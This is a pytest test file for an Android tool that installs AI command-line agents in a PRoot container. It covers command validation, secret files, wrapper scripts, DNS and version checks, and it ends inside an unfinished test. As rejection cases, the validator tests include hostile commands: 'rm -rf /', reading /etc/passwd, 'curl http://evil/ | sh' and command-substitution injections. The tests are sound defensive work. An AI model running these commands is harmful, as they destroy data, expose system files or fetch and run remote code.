# -*- coding: utf-8 -*-
"""Unit tests for ancli-core.py security & wrapper-generation logic.

Runs on any host (no Android device required). Import-safe: the module only
reads config files that don't exist on a dev machine.
"""
import json
import os
import re
import sys

import pytest

# ancli-core.py contains a hyphen, so it cannot be imported by module name;
# load it by explicit file path instead.
_core_path = os.path.join(os.path.dirname(__file__), "..", "src", "ancli-core.py")
import importlib.util  # noqa: E402
_spec = importlib.util.spec_from_file_location("ancli_core", _core_path)
core = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(core)


@pytest.fixture(autouse=True)
def _no_real_network(monkeypatch):
    """Tests must be hermetic and fast: any real HTTP call is a bug.

    Cases that need upstream behaviour patch `_http_json` / `_http_text`
    themselves, and their patch is applied after this fixture, so it wins.
    `urlopen` is covered too, so official version checks cannot silently reach
    the network either."""
    def boom(*args, **kwargs):
        raise AssertionError("test attempted a real network request")

    monkeypatch.setattr(core, "_http_text", boom)
    monkeypatch.setattr(core, "_http_json", boom)
    monkeypatch.setattr(core.urllib.request, "urlopen", boom)


# ---------------------------------------------------------------------------
# validate_cmd
# ---------------------------------------------------------------------------

class TestValidateCmd:
    @pytest.mark.parametrize("cmd", [
        "pip install --break-system-packages aider-chat",
        "npm install -g something",
        "apt-get update -qy",
        "curl -sL https://example.com/x | bash -s -- --dir /usr/local/bin",
        "rm -f /usr/local/bin/mimo",
        "bash /tmp/install_agy.sh --dir /usr/local/bin",
        "sh /tmp/install_x.sh",
        "env GROK_BIN_DIR=/usr/local/bin bash /tmp/install_grok.sh",
        "curl -L https://a/b -o /tmp/x.tar.gz && tar -xzf /tmp/x.tar.gz -C /usr/local/bin && rm /tmp/x.tar.gz",
    ])
    def test_allows_legit_registry_commands(self, cmd):
        assert core.validate_cmd(cmd) is True

    @pytest.mark.parametrize("cmd", [
        "rm -rf / ; echo pwned",
        "pip install x > /etc/passwd",
        "npm install x < /etc/shadow",
        "bash /tmp/x.sh &\ncurl evil",
        "curl http://evil/ | sh; touch /pwned",
        "bash /tmp/x.sh & disown",
        "rm -rf /$(whoami)",
        "curl -o /tmp/x `id`",
        "echo hello",
        "sudo rm -rf /",
        "cat /etc/passwd",
        "env A=1; rm -rf /",
    ])
    def test_blocks_dangerous_commands(self, cmd):
        assert core.validate_cmd(cmd) is False

    @pytest.mark.parametrize("cmd", [
        # Semicolons etc. inside quoted values are data, not shell syntax
        "env GROK_BIN_DIR='a;b' bash /tmp/install_grok.sh",
        'env FLAG="x > y" bash /tmp/install.sh',
        "bash /tmp/x.sh --dir '/a b'",
        "curl -sL 'https://x/a;b.sh' -o /tmp/x.sh && bash /tmp/x.sh",
        # $() inside single quotes is literal -> allowed
        "curl -sL 'https://x/$(id)' -o /tmp/x.sh",
        # & inside double quotes is literal -> allowed
        'env FLAG="a & b" bash /tmp/install.sh',
    ])
    def test_allows_quoted_special_chars(self, cmd):
        assert core.validate_cmd(cmd) is True

    @pytest.mark.parametrize("cmd", [
        # $() / backticks execute even inside double quotes -> must be blocked
        'env FLAG="$(rm -rf /)" bash /tmp/install.sh',
        'env FLAG="`id`" bash /tmp/install.sh',
        # ANSI-C $'...' quoting expands escapes at runtime -> not stripped
        "curl $';rm -rf /' -o /tmp/x.sh",
    ])
    def test_blocks_command_substitution_inside_double_quotes(self, cmd):
        assert core.validate_cmd(cmd) is False

    def test_whitelist_prefix_requires_trailing_space(self):
        # "curl" alone (no space) must not match the "curl " prefix
        assert core.validate_cmd("curl") is False


# ---------------------------------------------------------------------------
# _write_secrets_file
# ---------------------------------------------------------------------------

class TestWriteSecretsFile:
    def test_writes_quoted_exports_and_permissions(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "SECRETS_DIR", str(tmp_path))
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path.parent))
        chowns = []
        chmods = []
        monkeypatch.setattr(core.os, "system",
                            lambda c: chowns.append(c) or 0)
        monkeypatch.setattr(core.os, "chmod",
                            lambda p, m: chmods.append((os.path.normpath(str(p)), m)))

        core._write_secrets_file("my-tool", {"API_KEY": "sk-a b'c", "BASE_URL": "https://x"})

        secrets = tmp_path / "my-tool.env"
        assert secrets.exists()
        content = secrets.read_text(encoding="utf-8")
        assert "export API_KEY='sk-a b'\"'\"'c'\n" in content  # shlex.quote escaping
        assert "export BASE_URL=https://x\n" in content  # plain value stays unquoted
        # Directory 0700, secrets file 0600 (POSIX modes; asserted via chmod calls
        # since Windows filesystems do not honor mode bits)
        assert (os.path.normpath(str(tmp_path)), 0o700) in chmods
        assert (os.path.normpath(str(secrets)), 0o600) in chmods
        # shell user (UID 2000) must be able to traverse dir and read the file
        assert any("chown 2000:2000" in c and str(tmp_path) in c for c in chowns)
        assert any("chown 2000:2000" in c and "my-tool.env" in c for c in chowns)

    def test_replaces_existing_file(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "SECRETS_DIR", str(tmp_path))
        (tmp_path / "tool.env").write_text("export OLD=1\n")
        core._write_secrets_file("tool", {"NEW": "2"})
        content = (tmp_path / "tool.env").read_text(encoding="utf-8")
        assert "OLD" not in content
        assert "NEW" in content


# ---------------------------------------------------------------------------
# Bundled application catalog
# ---------------------------------------------------------------------------

class TestBundledCatalog:
    def test_loads_the_module_owned_catalog_without_network(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
        catalog = tmp_path / "ancli" / "registry.json"
        catalog.parent.mkdir(parents=True)
        catalog.write_text(json.dumps({"version": "test", "apps": {"foo": {}}}), encoding="utf-8")
        assert core.load_registry()["apps"]["foo"] == {}

    def test_missing_catalog_can_be_reported_without_exiting(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "missing"))
        assert core.load_registry(required=False) == {}


# ---------------------------------------------------------------------------
# pipe-script install command construction
# ---------------------------------------------------------------------------

class TestPipeScriptCommand:
    def test_env_prefix_uses_env_not_nested_bash_c(self):
        # Exercise the production builder (not a copy of it, which would stay
        # green even if _install_pipe_script drifted).
        installer_env = {"GROK_BIN_DIR": "/usr/local/bin", "FLAG": "a b"}
        script_path = "/tmp/install_grok.sh"
        installer_args = '--dir "/a b"'

        cmd = core._build_pipe_script_cmd(script_path, installer_env, installer_args)

        # No nested single quotes; every value individually quoted
        assert cmd.startswith("env ")
        assert "bash -c '" not in cmd
        assert core.validate_cmd(cmd) is True
        # Round-trip through shlex must reproduce the intended argv
        argv = shlex_split(cmd)
        assert argv[0] == "env"
        assert "GROK_BIN_DIR=/usr/local/bin" in argv
        assert "FLAG=a b" in argv
        assert argv[argv.index("bash") + 1] == script_path
        # Quoted installer arg survives as a single token
        assert "--dir" in argv and "/a b" in argv

    def test_without_env_or_args_is_a_plain_bash_call(self):
        assert core._build_pipe_script_cmd("/tmp/install_x.sh") == "bash /tmp/install_x.sh"


# ---------------------------------------------------------------------------
# DNS resolution
# ---------------------------------------------------------------------------

class TestDNS:
    def test_get_android_dns_reads_real_servers(self, monkeypatch):
        outputs = iter(["192.168.1.1", "0.0.0.0"])
        monkeypatch.setattr(
            core.subprocess, "check_output",
            lambda cmd, shell=True: outputs.__next__().encode(),
        )
        assert core._get_android_dns() == ["192.168.1.1"]

    def test_write_resolv_conf_prefers_android_dns(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ROOTFS", str(tmp_path))
        os.makedirs(tmp_path / "etc", exist_ok=True)
        monkeypatch.setattr(
            core.subprocess, "check_output",
            lambda cmd, shell=True: b"192.168.1.1",
        )
        core._write_resolv_conf()
        content = (tmp_path / "etc" / "resolv.conf").read_text(encoding="utf-8")
        lines = content.strip().splitlines()
        assert lines[0] == "nameserver 192.168.1.1"  # the device's real DNS first
        assert lines[1] == "nameserver 223.5.5.5"    # then the China-friendly fallback
        assert len(lines) == 3                        # glibc MAXNS
        assert len(lines) == len(set(lines))          # no duplicates
        assert "8.8.8.8" not in lines                 # never leads: blocked on many networks

    def test_get_android_dns_rejects_garbage(self, monkeypatch):
        # Only two getprop calls happen (net.dns1/net.dns2): a non-IP is rejected
        # and the IPv4 duplicate is deduplicated.
        outputs = iter(["10.0.0.2", "10.0.0.2"])
        monkeypatch.setattr(
            core.subprocess, "check_output",
            lambda cmd, shell=True: outputs.__next__().encode(),
        )
        assert core._get_android_dns() == ["10.0.0.2"]

        # Garbage first, IPv6 second: the junk is dropped, the IPv6 address is kept
        # (it is the only resolver this network offers — dumpsys-only IPv6 networks
        # exist on carriers that hand out no IPv4 DNS).
        outputs = iter(["not-an-ip", "2001:db8::1"])
        monkeypatch.setattr(
            core.subprocess, "check_output",
            lambda cmd, shell=True: outputs.__next__().encode(),
        )
        assert core._get_android_dns() == ["2001:db8::1"]

        # …but when an IPv4 resolver exists, only IPv4 is used: the three glibc
        # slots are better spent on resolvers a VPN-less container can always reach.
        outputs = iter(["2001:db8::1", "10.0.0.9"])
        monkeypatch.setattr(
            core.subprocess, "check_output",
            lambda cmd, shell=True: outputs.__next__().encode(),
        )
        assert core._get_android_dns() == ["10.0.0.9"]


# ---------------------------------------------------------------------------
# wrapper generation
# ---------------------------------------------------------------------------

class TestWrapperGeneration:
    def test_wrapper_template_has_cwd_fallback_and_binds(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
        monkeypatch.setattr(core, "MOD_DIR", str(tmp_path / "mod"))
        monkeypatch.setattr(core, "KSU_BIN", str(tmp_path / "ksu"))
        monkeypatch.setattr(core, "AP_BIN", str(tmp_path / "ap"))
        monkeypatch.setattr(core, "SECRETS_DIR", str(tmp_path / "secrets"))
        os.makedirs(tmp_path / "ancli" / "bin", exist_ok=True)

        core.generate_proot_wrapper("mimo", {"OPENAI_API_KEY": "sk-x"}, ["HOME=/root"])

        wrapper = (tmp_path / "ancli" / "bin" / "mimo").read_text(encoding="utf-8")
        # cwd fallback for unbound host paths -> container HOME
        assert "PROOT_CWD=\"$PWD\"" in wrapper
        assert "case \"$PROOT_CWD\"" in wrapper
        assert '-w "$PROOT_CWD"' in wrapper
        assert 'ANCLI_TUI_CWD=/root/.ancli-work' in wrapper
        assert 'PROOT_CWD="$ANCLI_TUI_CWD"' in wrapper
        # root-dir redirect so TUI tools don't scan the whole container fs
        assert 'if [ "$PROOT_CWD" = "/" ]; then' in wrapper
        assert "Launched from /" not in wrapper
        # /dev/shm conditional bind for Node/Bun workers
        assert 'SHM_BIND="-b ' in wrapper
        assert "shm:/dev/shm" in wrapper
        # The wrapper considers every common Android tree and skips only paths
        # absent from the caller's mount namespace (for example /sdcard under
        # some adb-root shells), avoiding a noisy proot warning.
        assert "for _ancli_bind in /sdcard /storage /mnt /data /apex /linkerconfig /system" in wrapper
        assert 'ANCLI_BIND_ARGS="$ANCLI_BIND_ARGS -b $_ancli_bind"' in wrapper
        assert "$ANCLI_BIND_ARGS" in wrapper
        # The Android-side launcher and generated app wrappers both bind the
        # Agent lifetime to the original terminal parent.
        assert 'ANCLI_PARENT_PID="$PPID"' in wrapper
        assert 'ANCLI_WRAPPER_PID="$$"' in wrapper
        assert 'pgrep -P "$ANCLI_WRAPPER_PID"' in wrapper
        assert 'kill -TERM "$_ancli_pid"' in wrapper
        assert 'wait "$ANCLI_WATCHDOG_PID"' in wrapper
        # Keep the PRoot command in the foreground so TUI input stays attached
        # to the terminal's foreground process group.
        assert not re.search(r'BROWSER=/usr/local/bin/xdg-open mimo "\$@" &', wrapper)
        # Re-entrance guard to prevent nested PRoot invocations
        assert 'if [ "$ANCLI_IN_CONTAINER" = "1" ] || [ -n "$PROOT_TMP_DIR" ]; then' in wrapper
        assert 'exec "/usr/local/bin/mimo" "$@"' in wrapper
        assert "export PROOT_NO_SECCOMP=1" in wrapper
        assert "ANCLI_IN_CONTAINER=1 PATH=" in wrapper
        # env bootstrap + per-tool secrets sourcing
        assert "ancli_env.sh" in wrapper
        assert "secrets/mimo.env" in wrapper
        # systemless + KSU/AP dual injection paths were attempted
        assert (tmp_path / "mod" / "system" / "bin" / "mimo").exists()

    def test_wrapper_rejects_path_traversal_executable(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
        core.generate_proot_wrapper("../evil", {})
        assert not (tmp_path / "ancli" / "bin").exists()


# ---------------------------------------------------------------------------
# WebUI JSON API
# ---------------------------------------------------------------------------

class TestWebUIJsonAPI:
    def _reg(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ROOTFS", str(tmp_path / "rootfs"))
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
        monkeypatch.setattr(core, "MOD_DIR", str(tmp_path / "mod"))
        monkeypatch.setattr(core, "KSU_BIN", str(tmp_path / "ksu"))
        monkeypatch.setattr(core, "AP_BIN", str(tmp_path / "ap"))
        monkeypatch.setattr(core, "SECRETS_DIR", str(tmp_path / "secrets"))
        monkeypatch.setattr(core, "INSTALLED_FILE", str(tmp_path / "ancli" / "installed.json"))
        os.makedirs(tmp_path / "ancli" / "bin", exist_ok=True)
        reg = {
            "version": "1.0",
            "apps": {
                "mimo": {"name": "MiMo Code", "executable": "mimo"},
                "agy": {"name": "Antigravity", "executable": "agy",
                        "version": "2.0", "env_vars": ["GEMINI_API_KEY"],
                        "optional_env_vars": ["HTTP_PROXY"]},
            },
        }
        reg_path = tmp_path / "ancli" / "registry.json"
        reg_path.write_text(json.dumps(reg), encoding="utf-8")
        return reg

    def test_list_apps_json_clean_output(self, tmp_path, monkeypatch, capsys):
        self._reg(tmp_path, monkeypatch)
        core.save_installed({"mimo": {"executable": "mimo", "installed_version": "1.0",
                                      "env": {"OPENAI_API_KEY": "x"}}})
        os.makedirs(tmp_path / "rootfs" / "usr" / "local" / "bin", exist_ok=True)
        (tmp_path / "rootfs" / "usr" / "local" / "bin" / "mimo").write_text("x")

        core.list_apps_json()
        data = json.loads(capsys.readouterr().out)  # must be pure JSON
        apps = {a["id"]: a for a in data["apps"]}
        assert apps["mimo"]["installed"] is True and apps["mimo"]["active"] is True
        assert apps["mimo"]["configured_keys"] == ["OPENAI_API_KEY"]
        assert apps["agy"]["installed"] is False
        assert "native" not in apps["agy"]
        assert apps["agy"]["update_available"] is False  # not installed
        assert "GEMINI_API_KEY" in apps["agy"]["required_env_vars"]
        assert "HTTP_PROXY" in apps["agy"]["optional_env_vars"]

    def test_status_json(self, tmp_path, monkeypatch, capsys):
        self._reg(tmp_path, monkeypatch)
        os.makedirs(tmp_path / "rootfs" / "bin", exist_ok=True)
        (tmp_path / "rootfs" / "bin" / "bash").write_text("")
        (tmp_path / "ancli" / "bin" / "proot").write_text("")

        core.status_json()
        d = json.loads(capsys.readouterr().out)
        assert d["rootfs_ready"] is True and d["proot_deployed"] is True
        assert d["installed_count"] == 0

    def test_parse_set_env(self):
        assert core.parse_set_env(["--set", "A=1", "--set", "B=2", "junk"]) == {"A": "1", "B": "2"}
        assert core.parse_set_env([]) == {}

    def test_reconfigure_noninteractive_merges_existing(self, tmp_path, monkeypatch):
        self._reg(tmp_path, monkeypatch)
        core.save_installed({"agy": {"executable": "agy", "installed_version": "1.0",
                                     "env": {"GEMINI_API_KEY": "old"}}})
        registry = {"apps": {"agy": {"name": "Antigravity", "executable": "agy",
                                     "env_vars": ["GEMINI_API_KEY"]}}}

        core.reconfigure_app("agy", registry, set_env={"GEMINI_API_KEY": "new"})

        installed = core.load_installed()
        assert installed["agy"]["configured_env"] == ["GEMINI_API_KEY"]
        # wrapper regenerated with the new secret
        wrapper = (tmp_path / "ancli" / "bin" / "agy").read_text(encoding="utf-8")
        assert "secrets/agy.env" in wrapper
        secrets = (tmp_path / "secrets" / "agy.env").read_text(encoding="utf-8")
        assert "GEMINI_API_KEY" in secrets and "new" in secrets


# ---------------------------------------------------------------------------
# WebUI JSON API
# ---------------------------------------------------------------------------
# ---------------------------------------------------------------------------
# Registry auth-config policy: only tools whose official docs confirm env-var
# auth keep env_vars. (Claude Code: ANTHROPIC_API_KEY skips its login prompt.)
# 2026-11-16：Codex CLI supports OPENAI_API_KEY/OPENAI_BASE_URL for headless auth.
# ---------------------------------------------------------------------------

def test_registry_env_vars_only_claude_code():
    """Policy: every app exposes the generic proxy trio (the documented escape hatch
    for TUN-only setups). Provider keys are exposed only where the vendor documents
    env-based auth — Claude Code (Anthropic) and DeepSeek Harness (DeepSeek); the
    other tools own their login flow internally."""
    with open(os.path.join(os.path.dirname(__file__), '..', 'src', 'registry.json'), encoding='utf-8') as f:
        reg = json.load(f)
    assert 'claude-code' in reg['apps']
    proxy_vars = {'HTTP_PROXY', 'HTTPS_PROXY', 'ALL_PROXY'}
    provider_vars = {
        'claude-code': {'ANTHROPIC_API_KEY', 'ANTHROPIC_AUTH_TOKEN',
                        'ANTHROPIC_BASE_URL', 'ANTHROPIC_MODEL'},
        'dsh': {'DEEPSEEK_API_KEY', 'DEEPSEEK_BASE_URL'},
        'codex-cli': {'OPENAI_API_KEY', 'OPENAI_BASE_URL'},
    }
    for aid, app in reg['apps'].items():
        exposed = set(app.get('env_vars') or []) | set(app.get('optional_env_vars') or [])
        allowed = proxy_vars | provider_vars.get(aid, set())
        assert app.get('optional_env_vars'), f'{aid} must expose the proxy escape hatch'
        assert proxy_vars <= exposed, f'{aid} is missing the proxy env vars'
        assert exposed <= allowed, f'{aid} exposes unexpected env vars: {sorted(exposed - allowed)}'
        if aid in provider_vars:
            assert provider_vars[aid] <= exposed, f'{aid} must keep its provider keys'


def shlex_quote(s):
    import shlex
    return shlex.quote(s)


def shlex_split(s):
    import shlex
    return shlex.split(s)


# ---------------------------------------------------------------------------
# Version comparison / update detection
# ---------------------------------------------------------------------------

class TestVersionCompare:
    def test_ver_key_parses_the_same_formats(self):
        # The prerelease-aware _ver_key replaced the older numeric-only parser;
        # its first four slots are still the version core.
        assert core._ver_key('v1.2.3')[:4] == (1, 2, 3, 0)
        assert core._ver_key('1.2.3')[:4] == (1, 2, 3, 0)
        assert core._ver_key('grok-dev@1.1.7')[:4] == (1, 1, 7, 0)
        assert core._ver_key('2.1.226')[:4] == (2, 1, 226, 0)
        assert core._ver_key('abc') is None
        assert core._ver_key('') is None

    def test_update_available_basic(self):
        assert core._update_available('1.0.0', '1.0.1') is True
        assert core._update_available('1.0.1', '1.0.0') is False
        assert core._update_available('1.0.1', '1.0.1') is False
        assert core._update_available('2.1.226', '2.1.226') is False

    def test_update_available_old_record_migration(self):
        # Old install records stored the AnCLI version (1.2.2) instead of the
        # tool version; a newer cloud version must still be detected.
        assert core._update_available('1.2.2', '2.1.226') is True
        assert core._update_available('1.2.2', '0.1.10') is False

    def test_update_available_unparsable(self):
        assert core._update_available('unknown', '1.0.0') is True
        assert core._update_available('1.0.0', 'unknown') is False
        assert core._update_available('unknown', 'unknown') is False


# ---------------------------------------------------------------------------
# Official ("upstream") version detection
# ---------------------------------------------------------------------------

class TestFirstVersion:
    @pytest.mark.parametrize("text,expected", [
        ('v2.1.283', '2.1.283'),
        ('2.1.226 (Claude Code)', '2.1.226'),
        ('grok 1.0.0 (3cd0d0cbce)', '1.0.0'),
        ('aider 0.86.2', '0.86.2'),
        ('1.0.41\n', '1.0.41'),
        ('', None),
        (None, None),
        ('no version here', None),
    ])
    def test_extracts_first_version_token(self, text, expected):
        assert core._first_version(text) == expected


class TestLatestVersion:
    def _app(self, spec, declared='9.9.9'):
        return {'latest': spec, 'version': declared}

    def test_github_release_tag(self, monkeypatch):
        urls = []

        def fake_json(url, timeout=15):
            urls.append(url)
            return {'tag_name': 'v2.1.283'}

        monkeypatch.setattr(core, '_http_json', fake_json)
        ver, src, err = core._latest_version(
            self._app({'source': 'github', 'repo': 'anthropics/claude-code'}), {})
        assert (ver, src, err) == ('2.1.283', 'github:anthropics/claude-code', None)
        assert urls == ['https://api.github.com/repos/anthropics/claude-code/releases/latest']

    def test_pypi_uses_dotted_path(self, monkeypatch):
        monkeypatch.setattr(core, '_http_json', lambda url, timeout=15: {'info': {'version': '0.86.2'}})
        ver, src, err = core._latest_version(self._app({'source': 'pypi', 'package': 'aider-chat'}), {})
        assert (ver, src, err) == ('0.86.2', 'pypi:aider-chat', None)

    def test_npm_latest_dist_tag(self, monkeypatch):
        monkeypatch.setattr(core, '_http_json', lambda url, timeout=15: {'version': '1.2.3'})
        assert core._latest_version(self._app({'source': 'npm', 'package': 'x'}), {})[0] == '1.2.3'

    def test_json_manifest_path(self, monkeypatch):
        payload = {'version': '1.2.12', 'url': 'https://example/x.tar.gz'}
        monkeypatch.setattr(core, '_http_json', lambda url, timeout=15: payload)
        ver, src, err = core._latest_version(
            self._app({'source': 'json', 'url': 'https://example/manifest.json', 'path': 'version'}), {})
        assert (ver, src, err) == ('1.2.12', 'manifest', None)

    def test_text_channel_falls_back_to_mirror(self, monkeypatch):
        tried = []

        def fake_text(url, timeout=15):
            tried.append(url)
            if 'x.ai' in url:
                raise OSError('connection refused')
            return '1.0.41\n'

        monkeypatch.setattr(core, '_http_text', fake_text)
        spec = {'source': 'text', 'urls': ['https://x.ai/cli/stable',
                                          'https://storage.googleapis.com/grok-build-public-artifacts/cli/stable']}
        assert core._latest_version(self._app(spec), {}) == ('1.0.41', 'channel', None)
        assert len(tried) == 2

    def test_text_channel_reports_error_when_all_urls_fail(self, monkeypatch):
        def boom(url, timeout=15):
            raise OSError('no route')

        monkeypatch.setattr(core, '_http_text', boom)
        ver, src, err = core._latest_version(self._app({'source': 'text', 'urls': ['https://x/1']}), {})
        assert ver is None and src == 'channel' and 'no route' in err

    def test_static_source_uses_declared_version(self):
        assert core._latest_version(self._app({'source': 'static'}, declared='1.1.27'), {}) == \
            ('1.1.27', 'registry', None)

    def test_none_source_is_explicitly_undetectable(self):
        assert core._latest_version(self._app({'source': 'none'}, declared='1.0.0'), {}) == \
            (None, 'none', None)

    def test_missing_spec_falls_back_to_declared_version(self):
        # A registry entry written before this feature must still work.
        assert core._latest_version({'version': '3.4.5'}, {}) == ('3.4.5', 'registry', None)

    def test_network_failure_is_reported_not_raised(self, monkeypatch):
        def boom(url, timeout=15):
            raise OSError('tls handshake failed')

        monkeypatch.setattr(core, '_http_json', boom)
        ver, src, err = core._latest_version(self._app({'source': 'github', 'repo': 'a/b'}), {})
        assert ver is None and src == 'github:a/b' and 'tls handshake failed' in err


# ---------------------------------------------------------------------------
# Installed-version probing
# ---------------------------------------------------------------------------

class TestVersionProbe:
    def test_registry_executables_extend_the_whitelist_only(self):
        registry = {'apps': {'claude-code': {'executable': 'claude'}}}
        prefixes = core._registry_exe_prefixes(registry)
        assert 'claude ' in prefixes
        assert core.validate_cmd('claude --version', prefixes) is True
        # The default whitelist is unchanged: an arbitrary command stays blocked.
        assert core.validate_cmd('claude --version') is False
        assert core.validate_cmd('cat /etc/passwd', prefixes) is False
        assert core.validate_cmd('claude --version; rm -rf /', prefixes) is False

    def test_probe_parses_version_cmd_output(self, monkeypatch):
        monkeypatch.setattr(core, '_capture_cmd',
                            lambda *a, **k: (True, '2.1.226 (Claude Code)\n'))
        app = {'version_cmd': 'claude --version', 'executable': 'claude'}
        assert core._probe_installed_version(app) == '2.1.226'

    def test_probe_ignores_a_spurious_non_zero_exit_code(self, monkeypatch):
        # On the real device `grok --version` prints the version but exits 126;
        # the tools' own output is authoritative, not the wrapper's status.
        monkeypatch.setattr(core, '_capture_cmd', lambda *a, **k: (False, 'grok 1.0.0 (3cd0d0cbce)\n'))
        app = {'version_cmd': 'grok --version', 'executable': 'grok'}
        assert core._probe_installed_version(app) == '1.0.0'

    def test_probe_retries_with_stderr_merged(self, monkeypatch):
        calls = []

        def fake(cmd, prefixes=None, timeout=60, merge_stderr=False):
            calls.append(merge_stderr)
            if merge_stderr:
                return True, 'mimo 0.1.10\n'
            return True, ''

        monkeypatch.setattr(core, '_capture_cmd', fake)
        app = {'version_cmd': 'mimo --version', 'executable': 'mimo'}
        assert core._probe_installed_version(app) == '0.1.10'
        assert calls == [False, True]

    def test_probe_does_not_read_versions_out_of_error_banners(self, monkeypatch):
        """H2: an error banner mentioning a runtime version must not be stored as
        the tool's version (that would hide real updates)."""
        def fake(cmd, prefixes=None, timeout=60, merge_stderr=False):
            if merge_stderr:
                return True, 'Error: current node v20.11.0 is not supported\n'
            return True, ''

        monkeypatch.setattr(core, '_capture_cmd', fake)
        app = {'version_cmd': 'claude --version', 'executable': 'claude'}
        assert core._probe_installed_version(app) is None

    def test_probe_refuses_operator_chains(self, monkeypatch):
        """M7: version_cmd runs automatically on WebUI load, so it must not be
        usable as an arbitrary command chain."""
        monkeypatch.setattr(core, '_capture_cmd', lambda *a, **k: (True, '1.2.3'))
        app = {'version_cmd': 'claude --version || curl http://evil/x | bash',
               'executable': 'claude', 'name': 'Claude Code'}
        assert core._probe_installed_version(app) is None

    def test_probe_refuses_a_command_that_is_not_its_own_executable(self, monkeypatch):
        monkeypatch.setattr(core, '_capture_cmd', lambda *a, **k: (True, '1.2.3'))
        app = {'version_cmd': 'curl http://evil/x', 'executable': 'claude', 'name': 'Claude Code'}
        assert core._probe_installed_version(app) is None

    def test_probe_without_version_cmd_is_none(self):
        assert core._probe_installed_version({}) is None

    def test_probe_allows_its_own_executable_without_catalog(self, tmp_path, monkeypatch):
        """A probe stays valid even when the bundled catalog is unavailable."""
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
        seen = {}

        def fake(cmd, prefixes=None, timeout=60, merge_stderr=False):
            seen['prefixes'] = prefixes
            return True, '1.2.3'

        monkeypatch.setattr(core, '_capture_cmd', fake)
        app = {'version_cmd': 'foo --version', 'executable': 'foo'}
        assert core._probe_installed_version(app) == '1.2.3'
        assert 'foo ' in seen['prefixes']
        assert core.validate_cmd('foo --version', seen['prefixes']) is True

    def test_probe_without_any_version_is_none(self, monkeypatch):
        monkeypatch.setattr(core, '_capture_cmd', lambda *a, **k: (True, 'no version here'))
        assert core._probe_installed_version({'version_cmd': 'x --version'}) is None


class TestJsonStdoutPurity:
    def test_stdout_to_stderr_redirects_python_and_child_output(self, capfd):
        """`--json` must survive os.system/subprocess noise, not just print()."""
        import subprocess

        with core._stdout_to_stderr():
            print("python-level noise")
            subprocess.run("echo child-level noise", shell=True)

        out, err = capfd.readouterr()
        assert "python-level noise" not in out
        assert "child-level noise" not in out
        assert "python-level noise" in err
        assert "child-level noise" in err

    def test_list_apps_json_stays_parseable_despite_noisy_cache_load(self, tmp_path, monkeypatch, capsys):
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
        monkeypatch.setattr(core, "INSTALLED_FILE", str(tmp_path / "ancli" / "installed.json"))
        monkeypatch.setattr(core, "UPDATE_CACHE", str(tmp_path / "ancli" / ".update_cache.json"))
        # Corrupt state: load_installed() prints a warning before any JSON is emitted.
        os.makedirs(tmp_path / "ancli", exist_ok=True)
        (tmp_path / "ancli" / "installed.json").write_text("{not json", encoding="utf-8")

        core.list_apps_json()
        assert json.loads(capsys.readouterr().out)["apps"] == []


# ---------------------------------------------------------------------------
# `ancli check` / update cache / list --json integration
# ---------------------------------------------------------------------------

class TestUpdateCheckFlow:
    def _env(self, tmp_path, monkeypatch, apps=None):
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
        monkeypatch.setattr(core, "ROOTFS", str(tmp_path / "rootfs"))
        monkeypatch.setattr(core, "MOD_DIR", str(tmp_path / "mod"))
        monkeypatch.setattr(core, "KSU_BIN", str(tmp_path / "ksu"))
        monkeypatch.setattr(core, "AP_BIN", str(tmp_path / "ap"))
        monkeypatch.setattr(core, "SECRETS_DIR", str(tmp_path / "secrets"))
        monkeypatch.setattr(core, "INSTALLED_FILE", str(tmp_path / "ancli" / "installed.json"))
        monkeypatch.setattr(core, "UPDATE_CACHE", str(tmp_path / "ancli" / ".update_cache.json"))
        os.makedirs(tmp_path / "ancli" / "bin", exist_ok=True)
        os.makedirs(tmp_path / "rootfs" / "usr" / "local" / "bin", exist_ok=True)
        (tmp_path / "rootfs" / "usr" / "local" / "bin" / "claude").write_text("x")
        registry = {"version": "1.2.3", "apps": apps if apps is not None else {
            "claude-code": {"name": "Claude Code", "executable": "claude",
                            "version_cmd": "claude --version",
                            "update_cmd": "curl -L https://github.com/anthropics/claude-code/"
                                          "releases/latest/download/claude-linux-arm64.tar.gz -o /tmp/claude.tar.gz",
                            "latest": {"source": "github", "repo": "anthropics/claude-code"},
                            "version": "2.1.283"},
        }}
        reg_path = tmp_path / "ancli" / "registry.json"
        reg_path.write_text(json.dumps(registry), encoding="utf-8")
        return registry

    def test_check_updates_probes_installed_and_caches_official(self, tmp_path, monkeypatch, capsys):
        registry = self._env(tmp_path, monkeypatch)
        core.save_installed({"claude-code": {"name": "Claude Code", "executable": "claude",
                                             "installed_version": "2.1.226", "env": {}}})
        monkeypatch.setattr(core, '_probe_installed_version', lambda app, reg=None: '2.1.283')
        monkeypatch.setattr(core, '_http_json', lambda url, timeout=15: {'tag_name': 'v2.1.283'})

        cache = core.check_updates(registry)
        capsys.readouterr()

        # installed.json now holds the tool's real version, marked verified
        installed = core.load_installed()
        assert installed['claude-code']['installed_version'] == '2.1.283'
        assert installed['claude-code']['version_verified'] is True
        # upstream verdict cached
        assert cache['latest']['claude-code']['version'] == '2.1.283'
        assert cache['latest']['claude-code']['source'] == 'github:anthropics/claude-code'
        assert cache['ts'] > 0
        assert json.loads((tmp_path / "ancli" / ".update_cache.json").read_text(encoding="utf-8"))['latest']['claude-code']['version'] == '2.1.283'

    def test_check_updates_json_emits_pure_json(self, tmp_path, monkeypatch, capsys):
        registry = self._env(tmp_path, monkeypatch)
        core.save_installed({"claude-code": {"name": "Claude Code", "executable": "claude",
                                             "installed_version": "2.1.226", "env": {}}})
        monkeypatch.setattr(core, 'load_registry', lambda: registry)
